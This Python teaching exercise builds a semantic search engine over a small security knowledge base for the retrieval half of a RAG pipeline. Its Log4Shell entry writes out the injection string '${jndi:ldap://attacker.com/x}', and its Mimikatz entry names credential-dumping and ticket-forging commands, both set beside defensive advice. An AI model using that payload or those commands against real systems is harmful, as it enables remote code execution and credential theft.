# Exercise 3 — Semantic Search over a Security Knowledge Base
#
# Builds a minimal semantic search engine from scratch:
# 1. Index: encode a document corpus into vectors (done once)
# 2. Query: encode the question, rank documents by cosine similarity
# This is the retrieval half of a RAG pipeline.
#
# pip install sentence-transformers

import numpy as np
from sentence_transformers import SentenceTransformer
from sklearn.metrics.pairwise import cosine_similarity

# ============================================================
#   TASK 1: Index the knowledge base
# ============================================================
print("=" * 60)
print("  TASK 1: Index the Knowledge Base")
print("=" * 60)

# Security knowledge base — 6 documents covering different topics
# Doc IDs and order are kept consistent with Lesson 4.4 (RAG) so the
# learner sees the same KB structure across both lessons.
KB = [
    {
        "id": "mimikatz",
        "title": "Mimikatz Credential Theft",
        "text": (
            "Mimikatz extracts plaintext passwords, NTLM hashes, and Kerberos tickets from "
            "Windows LSASS memory. Common techniques: sekurlsa::logonpasswords for plaintext "
            "credentials, lsadump::dcsync for replicating AD credentials, and kerberos::golden "
            "for forging Golden Tickets. Detection relies on monitoring LSASS memory access "
            "by non-system processes using Sysmon Event ID 10. Mitigations include enabling "
            "Windows Credential Guard and disabling WDigest authentication."
        ),
    },
    {
        "id": "log4shell",
        "title": "CVE-2021-44228 Log4Shell",
        "text": (
            "Log4Shell is a critical remote code execution vulnerability in Apache Log4j2. "
            "An attacker injects ${jndi:ldap://attacker.com/x} into any logged field such as "
            "User-Agent or X-Forwarded-For. The JNDI lookup triggers remote class loading "
            "without authentication. Remediation: upgrade to Log4j 2.17.1 or later. "
            "Detection: monitor for outbound LDAP connections from application servers and "
            "${jndi: patterns in web access logs."
        ),
    },
    {
        "id": "ransomware",
        "title": "Ransomware Incident Response Playbook",
        "text": (
            "Phase 1 (0-30 min): Confirm indicators, identify Patient Zero, assess blast radius. "
            "Do NOT reboot affected machines. Phase 2 (30 min-2 hr): Isolate via VLAN segmentation "
            "(not shutdown), disable compromised accounts, block C2 at perimeter firewall. "
            "Phase 3 (2-24 hr): Remove persistence mechanisms, reset all credentials, patch the "
            "initial access vector. Phase 4 (1-7 days): Restore from clean backups, prioritise "
            "critical business systems, monitor for re-infection indicators."
        ),
    },
    {
        "id": "lateral_movement",
        "title": "Lateral Movement Detection",
        "text": (
            "Lateral movement is when attackers move from one compromised host to other systems "
            "on the network. Common techniques include Pass-the-Hash, PsExec, WMI remote execution, "
            "and SMB file sharing. Detection: monitor for unusual SMB connections between workstations, "
            "logon type 3 events from unexpected sources, and service installations on remote hosts. "
            "Tools: Microsoft ATA, CrowdStrike Falcon, or custom Sigma rules on SIEM."
        ),
    },
    {
        "id": "phishing",
        "title": "Phishing Email Detection",
        "text": (
            "Phishing emails trick users into revealing credentials or executing malware. "
            "Indicators: sender domain mismatch, urgency language, suspicious attachments "
            "(especially .docm, .xlsm, .iso, .lnk), and URL shorteners. Technical controls: "
            "SPF, DKIM, and DMARC for email authentication. User training with simulated phishing "
            "campaigns reduces click rates. Quarantine emails scoring above threshold."
        ),
    },
    {
        "id": "network_segmentation",
        "title": "Network Segmentation for Defence",
        "text": (
            "Network segmentation divides a flat network into isolated zones to limit lateral "
            "movement. Key zones: DMZ for public-facing services, internal for business systems, "
            "OT/SCADA for operational technology, and management for admin access. Use VLANs and "
            "firewall rules to enforce zone boundaries. Zero Trust architecture extends this by "
            "verifying every connection regardless of network location."
        ),
    },
]

# Load the sentence embedding model
print("\nLoading all-MiniLM-L6-v2...")
model = SentenceTransformer("all-MiniLM-L6-v2")

# Encode all document text fields into vectors (Phase 1 — indexing)
# Each document's text becomes a searchable unit in the vector store
doc_texts = [doc["text"] for doc in KB]
doc_embeddings = model.encode(doc_texts)

print(f"\nIndexed {len(KB)} documents.")
print(f"Embedding matrix shape: {doc_embeddings.shape}")
for doc in KB:
    print(f"  - {doc['title']}")


# ============================================================
#   TASK 2: Implement the search function
# ============================================================
print("\n" + "=" * 60)
print("  TASK 2: Implement Search Function")
print("=" * 60)


def search(query, top_k=3, min_score=0.0):
    """Semantic search: encode the query, rank documents by cosine similarity.

    Args:
        query:     Natural language question
        top_k:     Number of results to return
        min_score: Minimum similarity score threshold (Task 4 bonus)

    Returns:
        List of (score, doc) tuples sorted by similarity descending
    """
    # Encode the query into the same vector space as the documents
    query_vec = model.encode([query])

    # Cosine similarity between the query and every document
    scores = cosine_similarity(query_vec, doc_embeddings)[0]

    # Pair each score with its document, sort by score descending
    results = []
    for idx in np.argsort(scores)[::-1][:top_k]:
        if scores[idx] >= min_score:
            results.append((float(scores[idx]), KB[idx]))

    return results


# Quick test
test_results = search("credential theft detection")
print(f"\nTest query: 'credential theft detection'")
print(f"Returned {len(test_results)} results.")
for score, doc in test_results:
    print(f"  {score:.4f} | {doc['title']}")


# ============================================================
#   TASK 3: Run 3 queries and evaluate
# ============================================================
print("\n" + "=" * 60)
print("  TASK 3: Run 3 Security Queries")
print("=" * 60)

queries = [
    "how do I detect mimikatz credential dumping?",
    "what should I do when ransomware hits?",
    "how to prevent attackers from moving between systems?",
]

for query in queries:
    results = search(query, top_k=3)
    print(f"\nQuery: {query}")
    for score, doc in results:
        print(f"  {score:.4f} | {doc['title']}")
    # Evaluation: check if the most relevant doc is at rank 1
    top_doc = results[0][1]["id"] if results else None
    print(f"  Top result: {top_doc}")


# ============================================================
#   TASK 4 (Bonus): Threshold filtering
# ============================================================
print("\n" + "=" * 60)
print("  TASK 4 (Bonus): Threshold Filtering")
print("=" * 60)

# With min_score filtering, irrelevant results are excluded entirely.
# An out-of-scope query should return fewer (or zero) results above threshold.
test_queries = [
    ("how to detect LSASS memory access?", 0.5),
    ("best pizza restaurants nearby", 0.5),     # out-of-scope query
    ("ransomware incident first 30 minutes", 0.4),
]

for query, threshold in test_queries:
    results = search(query, top_k=3, min_score=threshold)
    print(f"\nQuery: '{query}' (threshold={threshold})")
    if results:
        for score, doc in results:
            print(f"  {score:.4f} | {doc['title']}")
    else:
        print("  No results above threshold -- query is outside knowledge base scope.")

print("\nKey insight: threshold filtering prevents returning irrelevant results")
print("when the query is outside the knowledge base's coverage area.")

print("\n--- Exercise 3 complete. Lesson 2 done! ---")
